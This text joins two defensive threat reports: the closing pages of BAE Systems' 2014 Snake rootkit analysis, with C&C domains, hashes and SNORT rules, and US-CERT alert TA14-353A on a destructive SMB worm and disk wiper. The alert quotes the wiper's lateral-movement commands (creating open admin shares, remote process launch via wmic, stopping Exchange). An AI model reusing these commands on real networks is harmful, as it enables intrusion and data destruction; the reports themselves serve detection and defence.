• 	     proxy_bypass                                             • 	     no_server_hijack
• 	     proxy_server                                             • 	     imp_level
• 	     proxy_discover                                           • 	     net_password
• 	     proxy_passwd                                             • 	     net_user
• 	     proxy_user                                               • 	     write_peer_nfo
• 	     check_inet                                               • 	     read_peer_nfo
To post the data , the DLL can use the following User - Agent string “ Mozilla/4.0 ( compatible ; MSIE 6.0 ) ” .
It may rely on the following Internet Media types ( MIME types ) for data exfiltration :
• 	      application / x - shockwave - flash                            • 	     image / gif
• 	      image / pjpeg                                              • 	     application / msword
• 	      image / jpeg                                               • 	     application / vnd.ms - excel
• 	      image / x - xbitmap                                          • 	     application / vnd.ms - powerpoint
Request type it uses can either be POST of GET , and C&C server resource name is /default.asp .
BAE Systems Applied Intelligence : Snake Rootkit Report 2014         24
RECONNAISSANCE TOOL
One of the Snake components that could have been downloaded from a remote C&C server , was identified as a network
reconnaissance tool .
When run as a command line tool , with its logic defined with the command line switches , this tool enumerates other network hosts
and detects what Windows RPC services are enabled at the endpoints . It carries a list of interface identifiers associated with
the named pipes . It then uses these identifiers to write a message to and read a message from the associated named pipes . By
knowing what RPC services are running , it can successfully fingerprint all network hosts by mimicking the Metasploit ’s logic of OS
fingerprinting via SMB . The fingerprinting allows it to reveal the following characteristics for each host found in the network :
• 	    the version of the operating system
• 	    version of the service pack
• 	    the installed network services
The data it retrieves is encrypted and saved into a configuration file % system%\vtmon.bin . This file is then further encrypted with
an NTL - based ( Number Theory Library ) algorithm and is uploaded by the usermode - centric Snake rootkit to the C&C server , along
with other configuration files , such as mtmon.sdb , mtmon32.sdb , gstatsnd.bin , gstat.bin , gstat32.bin , and other log
files found in the % windows%\$NtUninstallQ[random]$ directory .
By using this function the remote attacker can identify any potentially exploitable hosts located in the same network as the victim .
The attacker may then craft an exploit against those hosts , possibly by using the Metasploit framework , and then deliver the
generated shellcode back to the reconnaissance tool to be applied against the identified hosts by running the tool with the
‘ exp_os’ switch .
If the tool successfully delivers the payload and exploits the remote host(s ) , it will replicate the infection across the network , taking
control over new hosts , thus repeating the infection cycle all over again and spreading the infection further . Unlike traditional worm
techniques , this process is rather manual , but its danger is in the fact that the attacker can flexibly craft new attack methods ,
adjusting them to the hosts present within the network , thus preying on the weakest ( least updated , most vulnerable ) victims along
its path .
BAE Systems Applied Intelligence : Snake Rootkit Report 2014             25
RELATIONSHIP TO AGENT.BTZ
As seen from the check - in logs found within one of the recent samples , the time span covers almost 6 years from January 2007 till
December 2012 , which is aligned with the first reports of Agent . BTZ . It ’s worth noting that Agent . BTZ used the same XOR key for its
logs as the most recent variants :
1dM3uu4j7Fw4sjnbcwlDqet4F7JyuUi4m5Imnxl1pzxI6as80cbLnmz54cs5Ldn4ri3do5L6gs923HL34x2f5cvd0fk6c1a0s
Log files created by the latest samples of Snake , compiled in 2013 and 2014 , were successfully decrypted with the same XOR key .
Other similarities include the usage of the virtual partition \\.\Vd1 , the temporary file named FA.tmp , usage of files named
mswmpdat.tlb , wmcache.nld , winview.ocx .
CONCLUSION
The cyber - espionage operation behind the Snake rootkit is well established , a sample comiled in January 2006 indicates that
the activity would have begun in at least 2005 . It is also sophisticated , using complex techniques for evading host defences and
providing the attackers covert communication channels . Toolmarks left behind by the authors ‘ vlad’ & ‘ gilg’ , leave tantalizing clues
as to the personas behind this .
From a technical perspective , Snake demonstrates two very different approaches to the task of building a cyber - espionage toolkit .
One approach is to delegate the network communication engine to usermode code , backed up by a usermode rootkit . Another
approach is to carry out all of the communications from the kernel - mode driver , which is a very challenging task by itself .
The complexity of the usermode - centric approach is on par with Rustock rootkit - it uses similar techniques . It ’s an old well - polished
technology that evolved over the years and demonstrated its resilience and survivability under the stress of security counter-
measures . The complexity of the kernel - centric architecture of Snake is quite unique . This architecture is designed to grant Snake
as much flexibility as possible . When most of the infected hosts are cut off from the outside world , it only needs one host to be
connected online . The traffic is then routed through that host to make external control and data exfiltration still possible .
The presence of the reconnaissance tool in the Snake operators’ framework suggests the existence of an arsenal of infiltration
tools , designed to compromise a system , then find a way to replicate into other hosts , infect them , and spread the infection
even further . As demonstrated , the backdoor commands allow Snake to provide remote attackers with full remote access to the
compromised system . Its ability to hibernate , staying fully inactive for a number of days , makes its detection during that time very
difficult .
The analysed code suggests that even file system and registry operations can be delegated by an infected module to another
module in order to stay unnoticed by behaviour analysis engines of the antivirus products , and to overcome account restrictions of
the browser processes so that the injected module could still write into files and into the sensitive registry hives .
The logs and dumps it creates on the hidden virtual volumes contributes to its stealthiness too . A great deal of attention has also
been given to keep its network communications as quiet as possible . Its ability to generate malicious traffic whenever the user
goes online and start loading the web pages allows it to ‘ blend in’ with the legitimate communications .
We expect much more will be uncovered by researchers in the coming weeks as the capabilities of this operation are further fleshed
out . However , as we implied in the opening section , we view this threat to be a permanent feature of the landscape . Whether they
dismantle this toolset and start from scratch , or continue using tools which have been exposed , remains to be seen . For their
targets though the considerable challenge of keeping secrets safe on sensitive networks will certainly continue for years to come .
RECOMMENDATIONS
• 	    Search logs for connections to Snake ’s command and control servers ( see Appendix A )
• 	    Search for MD5 hashes of the known samples ( see Appendix B )
• 	    Use Indicators of Compromise for building host - based rules ( see Appendix C )
• 	    Deploy SNORT rules for network based detection of Snake ( see Appendix D )
BAE Systems Applied Intelligence : Snake Rootkit Report 2014          26
APPENDIX A
Domain                         IP Address        Country      Contact Email              Nameserver
arctic-zone.bbsindex.com       124.248.207.50    HK           abuse@directnic.com        NS1.DTDNS.COM
cars-online.zapto.org          124.248.207.50    HK           domains@no-ip.com          NF1.NO - IP.COM
eunews-online.zapto.org        124.248.207.50    HK           domains@no-ip.com          NF1.NO - IP.COM
fifa-rules.25u.com             124.248.207.50    HK           abuse@web.com              NS1.CHANGEIP.ORG
forum.sytes.net                124.248.207.50    HK           domains@no-ip.com          NF1.NO - IP.COM
franceonline.sytes.net         124.248.207.50    HK           domains@no-ip.com          NF1.NO - IP.COM
freeutils.3utilities.com       124.248.207.50    HK           domains@no-ip.com          NF1.NO - IP.COM
health-everyday.faqserv.com    124.248.207.50    HK           abuse@web.com              NS1.CHANGEIP.ORG
nhl-blog.servegame.com         124.248.207.50    HK           domains@no-ip.com          NF1.NO - IP.COM
olympik-blog.4dq.com           124.248.207.50    HK           abuse@web.com              NS1.CHANGEIP.ORG
pockerroom.servebeer.com       124.248.207.50    HK           domains@no-ip.com          NF1.NO - IP.COM
pressforum.serveblog.net       124.248.207.50    HK           domains@no-ip.com          NF1.NO - IP.COM
scandinavia-facts.sytes.net    124.248.207.50    HK           domains@no-ip.com          NF1.NO - IP.COM
sportmusic.servemp3.com        124.248.207.50    HK           domains@no-ip.com          NF1.NO - IP.COM
stockholm-blog.hopto.org       124.248.207.50    HK           domains@no-ip.com          NF1.NO - IP.COM
supernews.sytes.net            124.248.207.50    HK           domains@no-ip.com          NF1.NO - IP.COM
sweeden-history.zapto.org      124.248.207.50    HK           domains@no-ip.com          NF1.NO - IP.COM
tiger.got-game.org             124.248.207.50    HK           abuse@web.com              NS1.CHANGEIP.ORG
top-facts.sytes.net            124.248.207.50    HK           domains@no-ip.com          NF1.NO - IP.COM
weather-online.hopto.org       124.248.207.50    HK           domains@no-ip.com          NF1.NO - IP.COM
wintersport.sytes.net          124.248.207.50    HK           domains@no-ip.com          NF1.NO - IP.COM
x-files.zapto.org              124.248.207.50    HK           domains@no-ip.com          NF1.NO - IP.COM
forum.4dq.com                  203.117.122.51    SG           abuse@web.com              NS1.CHANGEIP.ORG
forum.acmetoy.com              203.117.122.51    SG           abuse@web.com              NS1.CHANGEIP.ORG
marketplace.servehttp.com      59.125.160.178    TW           domains@no-ip.com           NF1.NO - IP.COM
music-world.servemp3.com       80.152.223.171    DE           domains@no-ip.com           NF1.NO - IP.COM
newutils.3utilities.com        80.152.223.171    DE           domains@no-ip.com           NF1.NO - IP.COM
interesting-news.zapto.org     80.152.223.171    DE           domains@no-ip.com           NF1.NO - IP.COM
north-area.bbsindex.com                                     abuse@directnic.com         NS1.DTDNS.COM
academyawards.effers.com                                    abuse@directnic.com         NS1.DTDNS.COM
cheapflights.etowns.net                                     abuse@directnic.com         NS1.DTDNS.COM
toolsthem.xp3.biz                                           support@freewha.com         NS2.FREETZI.COM
softprog.freeoda.com                                        support@freewha.com         NS1.ORGFREE.COM
euassociate.6te.net                                         support@freewha.com         NS1.6TE.NET
euland.freevar.com                                          support@freewha.com         NS1.UEUO.COM
communityeu.xp3.biz                                         support@freewha.com         NS2.FREETZI.COM
swim.onlinewebshop.net                                      abuse@enom.com              NS1.RUNHOSTING.COM
july.mypressonline.com                                      abuse@enom.com              NS1.RUNHOSTING.COM
winter.site11.com                                           abuse@godaddy.com           NS1.000WEBHOST.COM
eu-sciffi.99k.org                                           report@abuse.zymic.com NF1.99K.ORG
BAE Systems Applied Intelligence : Snake Rootkit Report 2014    27
APPENDIX B
MD5 Hash                             File Type           FileSize Compile Time                Notes
Kernel - centric architecture
f4f192004df1a4723cb9a8b4a9eb2fbf     32-bit driver       206 KB       2011 - 06 - 24 07:49:41 fdisk.sys , Ultra3.sys
626576e5f0f85d77c460a322a92bb267 32-bit dropper 1,669 KB 2013 - 02 - 04 13:19:21 fdisk_mon.exe
90478f6ed92664e0a6e6a25ecfa8e395     64-bit driver       584 KB       2013 - 02 - 04 13:17:56 fdisk.sys , Ultra3.sys
1c6c857fa17ef0aa3373ff16084f2f1c     32-bit driver       219 KB       2013 - 02 - 04 13:20:00 fdisk.sys , Ultra3.sys
Usermode - centric architecture
973fce2d142e1323156ff1ad3735e50d     32-bit driver       673 KB       2013 - 08 - 29 07:34:54 msw32.sys ,
cmbawt.sys
2eb233a759642abaae2e3b29b7c85b89 32-bit DLL             416 KB       2013 - 07 - 25 05:58:47 dropped DLL
Reconnaissance tool
c82c631bf739936810c0297d31b15519 32-bit exe             176 KB       2013 - 03 - 27 08:25:43 wextract.exe
Other analysed samples
f293c9640aa70b49f35627ef7fb58f15     32-bit exe          294 KB       2014 - 01 - 28 16:05:32 2014 sample
440802107441b03f09921138303ca9e9 32-bit driver          428 KB       2014 - 01 - 24 10:13:06 2014 sample
6406ad8833bafec59a32be842245c7dc     32-bit driver       277 KB       2013 - 03 - 29 07:51:34 Ultra3.sys ,
Adaptec Windows Ultra3
Family Driver
c09fbf1f2150c1cc87c8f45bd788f91f     32-bit DLL          404 KB       2013 - 03 - 28 06:49:36 dropped DLL
mscpx32n.dll
5ce3455b85f2e8738a9aceb815b48aee     32-bit driver       280 KB       2013 - 03 - 29 07:44:26 Ultra3.sys ,
Adaptec Windows Ultra3
Family Driver
b329095db961cf3b54d9acb48a3711da     32-bit DLL          412 Kb       2013 - 03 - 27 07:10:09 dropped DLL
kbdsmfno.dll
cfe0ef3d15f6a85cbd47e41340167e0b     32-bit dropper 363 KB           2012 - 12 - 18 08:22:47 mswint.exe,chset.exe
b86137fa5a232c614ec5405be4d13b37 32-bit DLL             223 KB       2012 - 12 - 18 08:22:43 libadcodec.dll
47f554745ef2a48baf3298a7aa2937e2     32-bit DLL          42 KB        2012 - 12 - 18 08:21:06 oleaut32.dll
ed785bbd156b61553aaf78b6f71fb37b      64-bit driver       435 KB       2011 - 06 - 24 07:47:59 A0009548.sys
1c18c3ef8717bb973c5091ce0bbf6428     32-bit exe          179 KB       2011 - 06 - 21 12:28:28 MSWAUDIT.EXE , utility
BAE Systems Applied Intelligence : Snake Rootkit Report 2014    28
APPENDIX C
Location       Type             Data
Memory         Event
\BaseNamedObjects\{B93DFED5 - 9A3B-459b - A617 - 59FD9FAD693E }
\BaseNamedObjects\shell.{F21EDC09 - 85D3 - 4eb9 - 915F-1AFA2FF28153 }
\BaseNamedObjects\wininet_activate
Memory         Device
\Device\RawDisk1
\Device\RawDisk2
\Device\vstor32
Memory         Antirootkit findings
unknown pages with executable code , that ca n't be mapped to any driver
presence of custom interrupt 0xC3 along with multiple hooks
hidden drivers Ultra3 , ~ROOT , hidden file fdisk.sys
File system    Volume
\\.\Hd1
\\.\Hd2
\\.\vd1
Registry       Key
HKLM\System\CurrentControlSer\Services\Ultra3
HKLM\System\CurrentControlSer\Services\~ROOT
File system    File
% windows%\$NtUninstallQ[random]$\mtmon.sdb
% windows%\$NtUninstallQ[random]$\mtmon_.sdb
% windows%\$NtUninstallQ[random]$\scmp.bin
% windows%\$NtUninstallQ[random]$\ucmp.bin
% windows%\$NtUninstallQ[random]$\isuninst.bin
% windows%\$NtUninstallQ[random]$\mswmpdat.tlb
% windows%\$NtUninstallQ[random]$\wmcache.nld
% windows%\$NtUninstallQ[random]$\SPUNINST\Temp
% system%\vtmon.bin
% windows%\$NtUninstallQ817473$\hotfix.dat
% windows%\$NtUninstallQ817473$\fdisk.sys
% windows%\$NtUninstallQ817473$\fdisk_mon.exe
% windows%\$NtUninstallQ817473$\rkng_inst.exe
Memory         Named Pipe
\\.\Pipe\SP[COMPUTERNAME ]
\\.\Pipe\UP[COMPUTERNAME ]
\\.\Pipe\isapi_http
\\.\Pipe\isapi_log
\\.\Pipe\isapi_dg
\\.\Pipe\services_control
BAE Systems Applied Intelligence : Snake Rootkit Report 2014    29
APPENDIX D
Canditate SNORT rules :
alert tcp $ EXTERNAL_NET $ HTTP_PORTS - > $ HOME_NET any ( msg:”Snake rootkit , usermode - centric encrypted command from
server ” ; content:”|01 00 00 00 00 00 00 00|1dM3uu4j7Fw4sjnb ” ; content:”HTTP/1.1 200 OK ” ; flow : to_client , established ;
sid:1000010 ; )
alert tcp $ HOME_NET any - > $ EXTERNAL_NET $ HTTP_PORTS ( msg:”Snake rootkit , usermode - centric client request ” ; content:”/1/6b-
558694705129b01c0 ” ; content:”Connection : Keep - Alive|0d 0a| ” ; flow : to_server , established ; sid:1000011 ; )
BAE Systems Applied Intelligence : Snake Rootkit Report 2014    30
FOR MORE INFORMATION CONTACT :
BAE Systems Applied Intelligence
E : 	 marketingai@baesystems.com
W : 	 www.baesysytems.com/ai
AUSTRALIA                             UK                                     US
Level 6                               Surrey Research Park                   265 Franklin Street
62 Pitt St                            Guildford                              Boston
Sydney NSW 2000                       Surrey , GU2 7RQ                        MA 02110
Australia                             United Kingdom                         USA
T : + 61 ( 0 ) 1300 027 001               T : + 44 ( 0 ) 1483 816000                 T : + 1 ( 617 ) 737 4170
MALAYSIA                              DUBAI
Unit 2B-12 - 1                          Dubai Internet City
Jalan Stesen Sentral 5                Building 17
Kuala Lumpur Sentral                  Office Ground Floor 53
Kuala Lumpur , 50470                   PO Box 500523
T : + 603 2780 2052                     Dubai
T : + 971 4369 4369
Copyright © BAE Systems 2014 .
All rights reserved . BAE SYSTEMS , the BAE SYSTEMS Logo and the product names referenced herein are trademarks of BAE
Systems plc . BAE Systems Applied Intelligence Limited registered in England & Wales ( No.1337451 ) with its registered office at
Surrey Research Park , Guildford , England , GU2 7RQ . No part of this document may be copied , reproduced , adapted or redistributed
in any form or by any means without the express prior written consent of BAE Systems Applied Intelligence .

Alert ( TA14 - 353A )
Targeted Destructive Malware
Original release date : December 19 , 2014
Systems Affected
Microsoft Windows
Overview
US - CERT was recently notified by a trusted third party of cyber threat actors using a Server Message Block ( SMB ) Worm Tool to conduct cyber exploitation
activities recently targeting a major entertainment company . This SMB Worm Tool is equipped with a Listening Implant , Lightweight Backdoor , Proxy Tool ,
Destructive Hard Drive Tool , and Destructive Target Cleaning Tool .
SMB Worm Tool : This worm uses a brute force authentication attack to propagate via Windows SMB shares . It connects home every five minutes to send log data
back to command and control ( C2 ) infrastructure if it has successfully spread to other Windows hosts via SMB port 445 . The tool also accepts new scan tasking
when it connects to C2 . There are two main threads : the first thread calls home and sends back logs ( a list of successful SMB exploitations ) , and the second thread
attempts to guess passwords for SMB connections . If the password is correctly guessed , a file share is established and file is copied and run on the newly - infected
host .
Listening Implant : During installation of this tool , a portion of the binaries is decrypted using AES , with a key derived from the phrase " National Football League . "
Additionally , this implant listens for connections on TCP port 195 ( for " sensvc.exe " and " msensvc.exe " ) and TCP port 444 ( for " netcfg.dll " ) . Each message sent to
and from this implant is preceded with its length , then XOR encoded with the byte 0x1F. Upon initial connection , the victim sends the string , " HTTP/1.1 GET /dns ?
\x00 . " The controller then responds with the string " 200 www.yahoo.com!\x00 " ( for " sensvc.exe " and " msensvc.exe " ) or with the string " RESPONSE 200 OK ! ! " ( for
" netcfg.dll " ) . The controller sends the byte " ! " ( 0x21 ) to end the network connection . This special message is not preceded with a length or XOR encoded .
Lightweight Backdoor : This is a backdoor listener that is designed as a service DLL . It includes functionality such as file transfer , system survey , process
manipulation , file time matching and proxy capability . The listener can also perform arbitrary code execution and execute commands on the command line . This
tool includes functionality to open ports in a victim host 's firewall and take advantage of universal Plug and Play ( UPNP ) mechanisms to discover routers and
gateway devices , and add port mappings , allowing inbound connections to victim hosts on Network Address Translated ( NAT ) private networks . There are no
callback domains associated with this malware since connections are inbound only on a specified port number .
Proxy Tool : Implants in this malware family are typically loaded via a dropper installed as a service , then configured to listen on TCP port 443 . The implant may
have an associated configuration file which can contain a configurable port . This proxy tool has basic backdoor functionality , including the ability to fingerprint the
victim machine , run remote commands , perform directory listings , perform process listings , and transfer files .
Destructive Hard Drive Tool : This tool is a tailored hard - drive wiping tool that is intended to destroy data past the point of recovery and to complicate the victim
machine ’s recovery . If the CNE operator has administrator - level privileges on the host , the program will over - write portions of up - to the first four physical drives
attached , and over - write the master boot record ( MBR ) with a program designed to cause further damage if the hard drive is re - booted . This further results in the
victim machine being non - operational with irrecoverable data ( There is a caveat for machines installed with the windows 7 operating system : windows 7 machines
will continue to operate in a degraded state with the targeted files destroyed until after reboot , in which the infected MBR then wipes the drive . ) If the actor has
user - level access , the result includes specific files being deleted and practically irrecoverable , but the victim machine would remain usable .
Destructive Target Cleaning Tool : This tool renders victim machines inoperable by overwriting the Master Boot Record . The tool is dropped and installed by another
executable and consists of three parts : an executable and a dll which contain the destructive components , and an encoded command file that contains the actual
destruction commands to be executed .
Network Propagation Wiper : The malware has the ability to propagate throughout the target network via built - in Windows shares . Based on the
username / password provided in the configuration file and the hostname / IP address of target systems , the malware will access remote network shares in order to
upload a copy of the wiper and begin the wiping process on these remote systems . The malware uses several methods to access shares on the remote systems to
begin wiping files . Checking for existing shares via “ \\hostname\admin$\system32 ” and “ \\hostname\shared$\system32 ” or create a new share “ cmd.exe /q /c net
share shared$=%SystemRoot% /GRANT : everyone , FULL ” . Once successful , the malware uploads a copy of the wiper file “ taskhostXX.exe ” , changes the file - time
to match that of the built - in file “ calc.exe ” , and starts the remote process . The remote process is started via the command “ cmd.exe /c wmic.exe /node : hostname
/user : username /password : pass PROCESS CALL CREATE ” . Hostname , username , and password are then obtained from the configuration file . Afterwards , the
remote network share is removed via “ cmd.exe /q /c net share shared$ /delete ” . Once the wiper has been uploaded , the malware reports its status back to one of
the four C2 IP addresses .
Technical and strategic mitigation recommendations are included in the Solution section below .
US - CERT recommends reviewing the Security Tip Handling Destructive Malware # ST13 - 003 .
Description
Cyber threat actors are using an SMB worm to conduct cyber exploitation activities . This tool contains five components – a listening implant , lightweight backdoor ,
proxy tool , destructive hard drive tool , and destructive target cleaning tool .
The SMB worm propagates throughout an infected network via brute - force authentication attacks , and connects to a C2 infrastructure .
Impact
Due to the highly destructive functionality of this malware , an organization infected could experience operational impacts including loss of intellectual property and
disruption of critical systems .
Solution
Users and administrators are recommended to take the following preventive measures to protect their computer networks :
Use and maintain anti - virus software – Anti - virus software recognizes and protects your computer against most known viruses . It is important to keep your
anti - virus software up - to - date ( see Understanding Anti - Virus Software for more information ) .
Keep your operating system and application software up - to - date – Install software patches so that attackers ca n't take advantage of known problems or
vulnerabilities . Many operating systems offer automatic updates . If this option is available , you should enable it ( see Understanding Patches for more
information ) .
Review Security Tip Handling Destructive Malware # ST13 - 003 and evaluate their capabilities encompassing planning , preparation , detection , and response
for such an event .
Review Recommended Practices for Control Systems , and Improving Industrial Control Systems Cybersecurity with Defense - in - Depth Strategies ( pdf ) .
The following is a list of the Indicators of Compromise ( IOCs ) that can be added to network security solutions to determine whether they are present on a network .
MD5s :
SMB worm tool :
MD5 : f6f48551d7723d87daeef2e840ae008f
Characterization : File Hash Watchlist
Notes : " SMB worm tool "
Earliest PE compile Time : 20141001T072107Z
Most Recent PE compile Time : 20141001T072107Z
MD5 : 194ae075bf53aa4c83e175d4fa1b9d89
Characterization : File Hash Watchlist
Notes : " SMB worm tool "
Earliest PE compile Time : 20141001T120954Z
Most Recent PE compile Time : 20141001T142138Z
Lightweight backdoor :
MD5 : f57e6156907dc0f6f4c9e2c5a792df48
Characterization : File Hash Watchlist
Notes : " Lightweight backdoor "
Earliest PE compile time : 20110411T225224Z
Latest PE compile time : 20110411T225224Z
MD5 : 838e57492f632da79dcd5aa47b23f8a9
Characterization : File Hash Watchlist
Notes : " Lightweight backdoor "
Earliest PE compile time : 20110517T050015Z
Latest PE compile time : 20110605T204508Z
MD5 : 11c9374cea03c3b2ca190b9a0fd2816b
Characterization : File Hash Watchlist
Notes : " Lightweight backdoor "
Earliest PE compile time : 20110729T062417Z
Latest PE compile time : 20110729T062958Z
MD5 : 7fb0441a08690d4530d2275d4d7eb351
Characterization : File Hash Watchlist
Notes : " Lightweight backdoor "
Earliest PE compile time : 20120128T071327Z
Latest PE compile time : 20120128T071327Z
MD5 : 7759c7d2c6d49c8b0591a3a7270a44da
Characterization : File Hash Watchlist
Notes : " Lightweight backdoor "
Earliest PE compile time : 20120309T105837Z
Latest PE compile time : 20120309T105837Z
MD5 : 7e48d5ba6e6314c46550ad226f2b3c67
Characterization : File Hash Watchlist
Notes : " Lightweight backdoor "
Earliest PE compile time : 20120311T090329Z
Latest PE compile time : 20120311T090329Z
MD5 : 0a87c6f29f34a09acecce7f516cc7fdb
Characterization : File Hash Watchlist
Notes : " Lightweight backdoor "
Earliest PE compile time : 20120325T053138Z
Latest PE compile time : 20130513T090422Z
MD5 : 25fb1e131f282fa25a4b0dec6007a0ce
Characterization : File Hash Watchlist
Notes : " Lightweight backdoor "
Earliest PE compile time : 20130802T054822Z
Latest PE compile time : 20130802T054822Z
MD5 : 9761dd113e7e6673b94ab4b3ad552086
Characterization : File Hash Watchlist
Notes : " Lightweight backdoor "
Earliest PE compile time : 20130913T013016Z
Latest PE compile time : 20130913T013016Z
MD5 : c905a30badb458655009799b1274205c
Characterization : File Hash Watchlist
Notes : " Lightweight backdoor "
Earliest PE compile time : 20140205T090906Z
Latest PE compile time : 20140205T090906Z
MD5 : 40adcd738c5bdc5e1cc3ab9a48b3df39
Characterization : File Hash Watchlist
Notes : " Lightweight backdoor "
Earliest PE compile time : 20140320T152637Z
Latest PE compile time : 20140402T023748Z
MD5 : 68a26b8eaf2011f16a58e4554ea576a1
Characterization : File Hash Watchlist
Notes : " Lightweight backdoor "
Earliest PE compile time : 20140321T014949Z
Latest PE compile time : 20140321T014949Z
MD5 : 74982cd1f3be3d0acfb0e6df22dbcd67
Characterization : File Hash Watchlist
Notes : " Lightweight backdoor "
Earliest PE compile time : 20140506T020330Z
Latest PE compile time : 20140506T020330Z
Proxy tool :
MD5 : 734740b16053ccc555686814a93dfbeb
Characterization : File Hash Watchlist
Notes : " Proxy tool "
Earliest PE compile time : 20140611T064905Z
Latest PE compile time : 20140611T064905Z
MD5 : 3b9da603992d8001c1322474aac25f87
Characterization : File Hash Watchlist
Notes : " Proxy tool "
Earliest PE compile time : 20140617T035143Z
Latest PE compile time : 20140617T035143Z
MD5 : e509881b34a86a4e2b24449cf386af6a
Characterization : File Hash Watchlist
Notes : " Proxy tool "
Earliest PE compile time : 20140618T064527Z
Latest PE compile time : 20140618T064527Z
MD5 : 9ab7f2bf638c9d911c2c742a574db89e
Characterization : File Hash Watchlist
Notes : " Proxy tool "
Earliest PE compile time : 20140724T011233Z
Latest PE compile time : 20140724T011233Z
MD5 : a565e8c853b8325ad98f1fac9c40fb88
Characterization : File Hash Watchlist
Notes : " Proxy tool "
Earliest PE compile time : 20140724T065031Z
Latest PE compile time : 20140902T135050Z
MD5 : 0bb82def661dd013a1866f779b455cf3
Characterization : File Hash Watchlist
Notes : " Proxy tool "
Earliest PE compile time : 20140819T024812Z
Latest PE compile time : 20140819T024812Z
MD5 : b8ffff8b57586d24e1e65cd0b0ad9173
Characterization : File Hash Watchlist
Notes : " Proxy tool "
Earliest PE compile time : 20140902T172442Z
Latest PE compile time : 20140902T172442Z
MD5 : 4ef0ad7ad4fe3ef4fb3db02cd82bface
Characterization : File Hash Watchlist
Notes : " Proxy tool "
Earliest PE compile time : 20141024T134136Z
Latest PE compile time : 20141024T134136Z
MD5 : eb435e86604abced7c4a2b11c4637a52
Characterization : File Hash Watchlist
Notes : " Proxy tool "
Earliest PE compile time : 20140526T010925Z
Latest PE compile time : 20140526T010925Z
MD5 : ed7a9c6d9fc664afe2de2dd165a9338c
Characterization : File Hash Watchlist
Notes : " Proxy tool "
Earliest PE compile time : 20140611T064904Z
Destructive hard drive tool :
MD5 : 8dec36d7f5e6cbd5e06775771351c54e
Characterization : File Hash Watchlist
Notes : " Destructive hard drive tool "
Earliest PE compile time : 20120507T151820Z
Latest PE compile time : 20120507T151820Z
MD5 : a385900a36cad1c6a2022f31e8aca9f7
Characterization : File Hash Watchlist
Notes : " Destructive target cleaning tool "
Earliest PE compile time : 20130318T003315Z
Latest PE compile time : 20130318T003315Z
MD5 : 7bea4323807f7e8cf53776e24cbd71f1
Characterization : File Hash Watchlist
Notes : " Destructive target cleaning tool "
Earliest PE compile time : 20130318T003319Z
Latest PE compile time : 20130318T003319Z
Name : d1c27ee7ce18675974edf42d4eea25c6.bin
Size : 268579 bytes ( 268.6 KB )
MD5 : D1C27EE7CE18675974EDF42D4EEA25C6
PE Compile Time : 2014 - 11 - 22 00:06:54
The malware has the following characteristics :
While the original filename of this file is unknown , it was likely “ diskpartmg16.exe ” . This file serves as a dropper . It drops destructive malware : “ igfxtrayex.exe ” .
When the dropper file was executed , it started a second instance of itself with “ -i ” as an argument , and then terminated . The second instance of the dropper file
installed itself as the “ WinsSchMgmt ” service with “ -k ” as a command line argument , started the service , and then terminated . The “ WinsSchMgmt ” service
executed the file with “ -k ” as an argument , which started another instance of the file using “ -s ” as an argument . The “ -s ” instance dropped and executed
“ igfxtrayex.exe ” , created “ net_ver.dat ” , and began generating network traffic over TCP ports 445 and 139 to victim IP addresses .
Name : net_ver.dat
Size : 4572 bytes ( 4.6 KB ) ( size will vary )
MD5 : 93BC819011B2B3DA8487F964F29EB934 ( hash will vary )
This is a log file created by the dropper , and appended to as the scans progress It contains what appear to be hostnames , IP addresses , and the number 2 .
Entries in the file have the structure “ HOSTNAME | IP Address | 2 ” .
Name : igfxtrayex.exe
Size : 249856 bytes ( 249.9 KB )
MD5 : 760C35A80D758F032D02CF4DB12D3E55
PE Compile Time : 2014 - 11 - 24 04:11:08
This file is destructive malware : a disk wiper with network beacon capabilities . If “ igfxtrayex.exe ” is run with no parameters , it creates and starts a copy of itself with
the “ –i ” argument . After 10 minutes , the “ igfxtrayex.exe ” makes three copies of itself and places them in the same directory from which it was executed . These
copies are named according to the format “ taskhostXX.exe ” ( where X is a randomly generated ASCII character ) . These copies are then executed , each with a
different argument ( one being “ -m ” , one being “ -d ” and the other “ -w ” ) . Network connection attempts are made to one of three hard - coded IP addresses in a random
order to port 8080 or 8000 . If a connection to the IP address can not be made , it attempts to connect to another of the three IP addresses , until connections to all
three IP addresses have been attempted . The following command - line string is then executed : “ cmd.exe /c net stop MSExchangeIS /y ” . A 120-minute ( 2 hour )
sleep command is issued after which the computer is shut down and rebooted .
Name : iissvr.exe
Size : 114688 bytes ( 114.7 KB )
MD5 : E1864A55D5CCB76AF4BF7A0AE16279BA
PE Compile Time : 2014 - 11 - 13 02:05:35
This file , when executed , starts a listener on localhost port 80 . It has 3 files contained in the resource section ; all xor’d with 0x63 .
Name : usbdrv3_32bit.sys
Size : 24280 bytes ( 24.3 KB )
MD5 : 6AEAC618E29980B69721158044C2E544
PE Compile Time : 2009 - 08 - 21 06:05:32
This SYS file is a commercially available tool that allows read / write access to files and raw disk sectors for user mode applications in Windows 2000 , XP , 2003 ,
Vista , 2008 ( 32-bit ) . It is dropped from resource ID 0x81 of “ igfxtrayex.exe ” .
Name : usbdrv3_64bit.sys
Size : 28120 bytes ( 28.1 KB )
MD5 : 86E212B7FC20FC406C692400294073FF
PE Compile Time : 2009 - 08 - 21 06:05:35
This SYS file is a also a commercially available tool that allows read / write access to files and raw disk sectors for user mode applications in Windows 2000 , XP ,
2003 , Vista , 2008 ( 64-bit ) . It is dropped from resource ID 0x83 of “ igfxtrayex.exe ” .
Name : igfxtpers.exe
Size : 91888 bytes ( 91.9 KB )
MD5 : e904bf93403c0fb08b9683a9e858c73e
PE Compile Time : 2014 - 07 - 07 08:01:09
A summary of the C2 IP addresses :
IP Address                                          Country                                    Port            Filename
203.131.222.102                                     Thailand                                   8080            Diskpartmg16.exe
igfxtrayex.exe
igfxtpers.exe
217.96.33.164                                       Poland                                     8000            Diskpartmg16.exe
igfxtrayex.exe
88.53.215.64                                        Italy                                      8000            Diskpartmg16.exe
igfxtrayex.exe
200.87.126.116                                      Bolivia                                    8000            File 7
58.185.154.99                                       Singapore                                  8080            File 7
212.31.102.100                                      Cypress                                    8080            File 7
208.105.226.235                                     United States                              --              igfxtpers.exe
Snort signatures :
SMB Worm Tool ( not necessarily the tool itself ) :
alert tcp any any - > any any ( msg:"Wiper1";content:"|be 64 ba f2 a8 64|";offset:16;depth:6;sid:1 ; )
alert tcp any any - > any any ( msg:"Wiper2";content:"|c9 06 d9 96 fc 37 23 5a fe f9 40 ba 4c 94 14 98|";offset:0;depth:16;sid:3 ; )
alert tcp any any - > any any ( msg:"Wiper3";content:"|aa 64 ba f2 56 9b|";offset:0;depth:50;sid:2 ; )
